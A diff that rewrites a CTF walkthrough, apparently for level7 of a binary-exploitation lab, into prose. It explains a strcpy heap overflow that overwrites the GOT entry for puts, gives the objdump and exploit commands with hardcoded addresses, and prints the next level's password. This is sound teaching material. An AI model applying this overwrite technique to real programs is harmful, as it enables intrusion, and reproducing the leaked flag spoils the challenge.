@@ -1,8 +1,19 @@
-objdump -RTDxs -m i386 ./level7
+# What do we exploit?
 
-objdump -RTDxs -m i386 ./level7 | grep "<m>"
-objdump -RTDxs -m i386 ./level7 | grep puts
+Heap overflow joined with the writability of the GOT using insecure `strcpy` function.
 
-./level7 $(python -c 'print "A"*4') $(python -c 'print "B"*4')
+# How do we exploit it?
 
-./level7 $(python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
+After some analysis of the binary, we can figure out, that it basically allocates several variables, two of which will be the destination point for writing the two input arguments. The copying will be done using the `strcpy` function. In addition, it expects to receive no less than two input arguments.
+
+Let's calculate the size of the memory, allocated for the first input argument using this [tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/). The size of memory, allocated for the first argument, is equal 20. So we'll need to pass 20 bytes of whatever, and then pass two addresses, which definitely will be out of bounds of malloced memory.
+
+Now we should find `puts` function address in the GOT using, of course, `objdump`. Also we'll need an address of the function we want execute instead of the `puts`, to pass it like a second argument. This time, we'll use more "greedy" work mode for the `objdump`, to get more valuable information.
+
+    objdump -d -m i386 -DRTsx ./level7
+
+Having all that done, we can form the exploit string, which, in our case, will look like this:
+
+    ./level7 $(python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
+
+Running this command instantly again gets us the password to the next level: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`.
